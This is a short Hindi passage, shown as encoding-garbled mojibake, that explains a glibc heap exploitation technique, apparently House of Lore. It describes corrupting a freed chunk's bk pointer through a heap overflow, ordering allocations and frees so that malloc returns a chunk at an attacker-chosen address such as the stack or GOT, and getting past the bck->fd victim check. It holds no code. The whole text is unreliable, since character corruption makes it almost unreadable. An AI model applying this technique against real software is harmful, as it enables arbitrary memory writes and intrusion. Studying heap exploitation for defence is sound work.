рд▓рдХреНрд╖реНрдп рдпрд╣ рд╣реИ, рдпрджрд┐ рд╣рдо рдПрдХ рд╣реАрдк рдХреЛ overflow рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдХреЗ рдиреАрдЪреЗ рдПрдХ рдореБрдХреНрдд рдЯреБрдХрдбрд╝рд╛ рд╣реИ рдФрд░ рдЙрд╕рдХреЗ bin рдореЗрдВ рд╣реИ, рддреЛ рд╣рдо рдЙрд╕рдХреЗ рдкреНрд╡рд╛рдЗрдВрдЯрд░ bk рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдЧрд░ рд╣рдо рдЙрд╕рдХреЗ рдкреНрд╡рд╛рдЗрдВрдЯрд░ bk рдХреЛ рдмрджрд▓ рджреЗрддреЗ рд╣реИрдВ рдФрд░ рдпрд╣ рдЯреБрдХрдбрд╝рд╛ bin рдХреА рдкрд╣рд▓реА рд╕реВрдЪреА рдореЗрдВ рдЖ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рд░рд┐рдЬрд░реНрд╡ рд╣реЛрддрд╛ рд╣реИ, рддреЛ bin рдХреЛ рдзреЛрдЦрд╛ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдЙрд╕реЗ рдмрддрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдХрд┐ рд╕реВрдЪреА рдХрд╛ рдЕрдВрддрд┐рдо рдЯреБрдХрдбрд╝рд╛ (рдЕрдЧрд▓рд╛ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рд╡рд╛рд▓рд╛) рд╣рдордиреЗ рдирдХрд▓реА рдкрддреЗ рдкрд░ рд░рдЦ рджрд┐рдпрд╛ рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рд╕реНрдЯреИрдХ рдпрд╛ GOT)ред рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдПрдХ рдФрд░ рдЯреБрдХрдбрд╝рд╛ рд░рд┐рдЬрд░реНрд╡ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкрд╛рд╕ рдЙрд╕рдореЗрдВ рдЕрдиреБрдорддрд┐ рд╣реИ, рддреЛ рдЙрд╕реЗ рд╡рд╛рдВрдЫрд┐рдд рд╕реНрдерд╛рди рдкрд░ рдПрдХ рдЯреБрдХрдбрд╝рд╛ рдорд┐рд▓реЗрдЧрд╛ рдФрд░ рдЙрд╕рдореЗрдВ рд▓рд┐рдЦ рд╕рдХреЗрдЧрд╛ред

рд╕рдВрд╢реЛрдзрд┐рдд рдЯреБрдХрдбрд╝рд╛ рдореБрдХреНрдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдЙрд╕реЗ рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреЛ рд░рд┐рдЬрд░реНрд╡ рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ, рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╕рдВрд╢реЛрдзрд┐рдд рдЯреБрдХрдбрд╝рд╛ unsorted bins рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдЙрд╕рдХреЗ bin рдореЗрдВ рдбрд╛рд▓ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдЙрд╕рдХреЗ bin рдореЗрдВ рдПрдХ рдмрд╛рд░ рдЖрдиреЗ рдХреЗ рдмрд╛рдж рдЙрд╕рдХреЗ рдкреНрд╡рд╛рдЗрдВрдЯрд░ bk рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХрд╛ рд╕рдордп рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ рд╣рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреА рджрд┐рд╢рд╛ рдореЗрдВ рдЗрдЪреНрдЫрд┐рдд рдирд┐рд░реНрджреЗрд╢ рдХрд░реЗред

рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рдЙрддреНрддрд░рджрд╛рдпрд┐рддреНрд╡ рдХреЛ рдЬрд▓реНрджреА рд╕реЗ рдЬрд▓реНрджреА рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрджрд░реНрд╢ рд╣реЛрдЧрд╛: рд╡рдВрд╢реАрдп рдЯреБрдХрдбрд╝рд╛ рдХреА рд░рд┐рдЬрд░реНрд╡реЗрд╢рди, рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рд░рд┐рдЬрд░реНрд╡реЗрд╢рди, рдпрд╣ рдЯреБрдХрдбрд╝рд╛ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЙрд╕рд╕реЗ рдЕрдзрд┐рдХ рдмрдбрд╝рд╛ рдЯреБрдХрдбрд╝рд╛ рд░рд┐рдЬрд░реНрд╡ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЯреБрдХрдбрд╝рд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдХрдордЬреЛрд░реА), рд╕рдВрд╢реЛрдзрд┐рдд рдЯреБрдХрдбрд╝реЗ рдХреЗ рдмрд░рд╛рдмрд░ рдПрдХ рдЯреБрдХрдбрд╝рд╛ рд░рд┐рдЬрд░реНрд╡ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдПрдХ рджреВрд╕рд░рд╛ рдЯреБрдХрдбрд╝рд╛ рдмрд░рд╛рдмрд░ рдЖрдХрд╛рд░ рдХрд╛ рд░рд┐рдЬрд░реНрд╡ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдпрд╣ рд╡рд╣ рд╣реЛрдЧрд╛ рдЬреЛ рдЪрдпрдирд┐рдд рдкрддреЗ рдкрд░ рдкреНрд╡рд╛рдЗрдВрдЯ рдХрд░реЗрдЧрд╛ред

рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдЬрд╛рдВрдЪ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдЯреБрдХрдбрд╝рд╛ "рдЧрд▓рдд" рдирд╣реАрдВ рд╣реИ: рдЬрд╛рдВрдЪрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ bck->fd victim рдХреЛ рдкреЙрдЗрдВрдЯ рдХрд░ рд░рд╣рд╛ рд╣реИред рдЕрд░реНрдерд╛рдд, рд╣рдорд╛рд░реЗ рдорд╛рдорд▓реЗ рдореЗрдВ рдпрджрд┐ рд╕реНрдЯреИрдХ рдореЗрдВ рдирдХрд▓реА рдкрддреЗ рдкрд░ рдкреЙрдЗрдВрдЯ рдХрд░ рд░рд╣реЗ рдЯреБрдХрдбрд╝реЗ рдХрд╛ рдлреЗрдбрд░рд▓ рдбрд╛рдпрд░реЗрдХреНрд╢рди рд╡рд┐рдХреНрдЯрд┐рдо рдХреЛ рдкреЙрдЗрдВрдЯ рдХрд░ рд░рд╣рд╛ рд╣реИред рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдкрд╛рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдХрд┐рд╕реА рддрд░рд╣ рд╕реЗ (рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рд╕реНрдЯреИрдХ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ) рдЙрдЪрд┐рдд рдкрддреЗ рдкрд░ рд╡рд┐рдХреНрдЯрд┐рдо рдХреЗ рдкрддреЗ рдХреЛ рд▓рд┐рдЦрдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред рддрд╛рдХрд┐ рдРрд╕рд╛ рд▓рдЧреЗ рдХрд┐ рдПрдХ рд╕рдЪреНрдЪрд╛ рдЯреБрдХрдбрд╝рд╛ рд╣реИред
